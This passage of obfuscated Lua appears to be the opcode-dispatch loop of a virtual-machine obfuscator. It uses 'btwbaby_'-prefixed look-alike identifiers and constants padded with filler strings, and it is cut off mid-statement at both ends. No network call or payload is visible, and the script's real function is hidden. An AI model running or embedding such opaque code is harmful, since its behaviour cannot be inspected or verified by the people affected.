111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vYUT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TB2")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qo")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JZ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LUk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xb")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vGC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{903;244;723;994};"1 + 1 = 111";"1 + 1 = 111";{465;8;247;229};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nL")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kti")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4f")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yik")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XL6")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("PEL3")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LR")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nzz")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{92;811;557;520};{616;805;222;89};}]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WT")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9XR")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("p4")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{288;711;936;73};{627;818;264;456};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("CmJm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5h")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZmE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2M")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wa")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hvb")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P7")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7zB0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{524;474;3;338};{688;865;409;633};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vpQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sx")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n2")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gu3")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Q")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Fgn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("8IyR")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2R")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("vTz")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{472;809;434;629};"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("d8")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Yz1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3t")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MYP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WfAl")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xc")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OsJ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZC")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y5")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("K5F")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ej")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mlf")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dMj8")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Md")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hB6")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("9b")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{293;398;443;178};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aJ0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("j9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9rG")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("GJRa")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("X6")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7Dm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qL")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tZ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xGL")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("r5")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KFM")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("uIec")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kz")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VCI")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("xc")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YX")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MY9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("on")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OPA")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rXYB")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5e")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("DOQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PM")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8O")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{354;734;358;375};{280;372;821;845};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{825;279;978;717};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WVD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7y40")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eI")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("SMc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("UV")]btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl]=btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl](btwbaby_llllIllI[btwbaby_lIIlIlIIlIlIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ht")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LIi")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dY")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YiC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{937;186;962;342};"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L4")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("bqf")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jezo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{144;912;674;991};"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rvj")]];else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dZA")]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("Q6NxIYoJvs5PiAsMYET15SskglSHt")then if btwbaby_IIlIllIIlIlIIlIIIl>#("RGbL0QenMQrFfpI2IhQ7Zfzjl7ND")then local btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("3u")]btwbaby_llllIllI[btwbaby_llIIllIll](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_llIIllIll+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZJI")]))else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dO")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("tpb")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("0dK5")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("vgSoKMAOIKNHK1cJBMdNnNK0v6Lh2A")then btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{666;772;288;98};"1 + 1 = 111";{334;670;700;516};}];elseif btwbaby_IIlIllIIlIlIIlIIIl==#("cM6pKKpGNhoaIdAoovKVuJZcTG22Obs")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bs")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{306;125;428;289};"1 + 1 = 111";"1 + 1 = 111";}];else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rO")]]={};end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("hQK5OLD9kgAG9NcW6SvVsPJEW4HeRx2MZD21EFLO3LKnitdfE")then if btwbaby_IIlIllIIlIlIIlIIIl<=#{{190;798;264;774};{313;674;770;683};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{25;170;395;960};"1 + 1 = 111";{612;646;710;504};{313;617;810;122};"1 + 1 = 111";"1 + 1 = 111";{326;306;787;354};"1 + 1 = 111";{106;211;405;417};{441;373;898;855};"1 + 1 = 111";{212;274;666;240};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{321;20;922;909};{132;623;283;972};{926;116;198;841};{156;749;909;423};{62;851;247;455};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{529;348;722;620};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{223;46;756;411};{970;885;950;164};"1 + 1 = 111";{971;228;421;850};"1 + 1 = 111";}then if btwbaby_IIlIllIIlIlIIlIIIl<=#("yv1KFsW8uNHvtXFZ6OVyWVQ3MYQxs0yFtA4f")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("hxzsv9ZsfqZ6gaOpc7MQ88RNAQFpcb32zK")then if btwbaby_IIlIllIIlIlIIlIIIl>#("rvfAW0KGH0Bl0UprDsAqjQW2QFKqex7HH")then do return end;else for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5s")],btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{896;850;33;137};"1 + 1 = 111";}]do btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=nil;end;end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#("v36IZZzCjW8EOFWTBJ9sPLKmUrqsCj33PPy")then local btwbaby_lIlIIllIllIlIIlI=btwbaby_IIlIIIlIllIllllIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mib")]];local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_lIIlIlIIlIlIl={};btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_llIlIlllIlIlllIIlIlIl({},{__index=function(btwbaby_llIIllIll,btwbaby_IllIIIllIlIIIIIlIIIllII)local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIIllIlIIIIIlIIIllII];return btwbaby_IllIIIllIlIIIIIlIIIllII[1][btwbaby_IllIIIllIlIIIIIlIIIllII[2]];end,__newindex=function(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_llIIllIll)local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIIllIlIIIIIlIIIllII]btwbaby_IllIIIllIlIIIIIlIIIllII[1][btwbaby_IllIIIllIlIIIIIlIIIllII[2]]=btwbaby_llIIllIll;end;});for btwbaby_IllIIlllIIIIlIllIl=1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("yRBv")]do btwbaby_llIIllIll=btwbaby_llIIllIll+1;local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];if btwbaby_IllIIIllIlIIIIIlIIIllII[#("f")]==21 then btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIlllIIIIlIllIl-1]={btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII[#("0ae")]};else btwbaby_lIIlIlIIlIlIl[btwbaby_IllIIlllIIIIlIllIl-1]={btwbaby_lllIllIIlIlIlIllIIIIIIIII,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Lkd")]};end;btwbaby_llIIIlIlllll[#btwbaby_llIIIlIlllll+1]=btwbaby_lIIlIlIIlIlIl;end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ad")]]=btwbaby_IIllIIIIlI(btwbaby_lIlIIllIllIlIIlI,btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_IllIIlllIIIIlIllIl);else local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mt1")];local btwbaby_llIIllIll=btwbaby_llllIllI[btwbaby_IIIllIlIIlI]for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ADvJ")]do btwbaby_llIIllIll=btwbaby_llIIllIll..btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII];end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llIIllIll;end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("u5DK2SG93l0eFu6yHnGVtUXIJf992fY9gAzGgA")then if btwbaby_IIlIllIIlIlIIlIIIl==#("7eKsIClYhnGxCiNcLh5aXSHgYy08e6BrhXIQT")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z2")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{368;757;479;919};"1 + 1 = 111";"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("9r8G")]];else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("td")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gBJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PRt5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mq")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AfA")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zj")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XeX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wl")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pfH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pjZ1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XQ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("H0X")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("on2r")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("kLA")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("p7